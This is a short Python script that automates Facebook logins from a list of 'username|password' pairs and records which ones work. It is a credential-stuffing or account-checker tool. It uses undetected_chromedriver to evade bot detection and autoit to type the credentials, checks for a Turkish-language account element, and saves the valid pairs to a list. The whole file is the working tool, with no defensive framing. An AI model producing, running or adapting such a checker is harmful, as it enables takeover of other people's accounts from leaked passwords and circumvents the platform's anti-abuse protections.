import time
import autoit
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as expect
from selenium.webdriver.support.wait import WebDriverWait


userName_passWord = [] #get usernames and passwords in this list. format="username|password"
userNames = [] 
passWords = []
accountCount = 0
onlineAccounts = []


for line in userName_passWord: #split the format into username and password
    splitter = line.split('|')
    userNames.append(splitter[0])
    passWords.append(splitter[1])

def run_log(userName, passWord, isActive):
    if isActive == True:
        print("OK --" + userName + '|' + passWord)
        onlineAccounts.append(userName + '|' + passWord)
    else:
        print("FAIL --" + userName + '|' + passWord)

#Main App:
if __name__ == "__main__":
    for line in userNames:
        driver = uc.Chrome()
        driver.get("https://www.facebook.com")
        try:
            time.sleep(2)

            email_input = driver.find_element(By.ID, "email")
            email_input.click()
            autoit.send(userNames[accountCount])

            time.sleep(0.5)

            password_input = driver.find_element(By.ID, "pass")
            password_input.click()

            time.sleep(0.5)
            
            autoit.send(passWords[accountCount])
            login_btn = driver.find_element(By.NAME, "login")

            time.sleep(0.5)

            login_btn.click()

            logincheck = WebDriverWait(driver, 5).until(
                expect.element_to_be_clickable((By.XPATH, "//div[@aria-label='Hesap']"))) 
                        #for turkish webpage(Hesap means account in turkish, get the xpath again if you are using another lang option)

            time.sleep(1)

            driver.quit()
            run_log(line, passWords[accountCount], True)

        except Exception as e:
            try:
                logincheck = WebDriverWait(driver, 5).until(
                    expect.element_to_be_clickable((By.XPATH, "//div[@aria-label='Hesap']")))
                
                run_log(line, passWords[accountCount], True)

                driver.quit()

            except Exception as e:
                run_log(line, passWords[accountCount], False)
                driver.quit()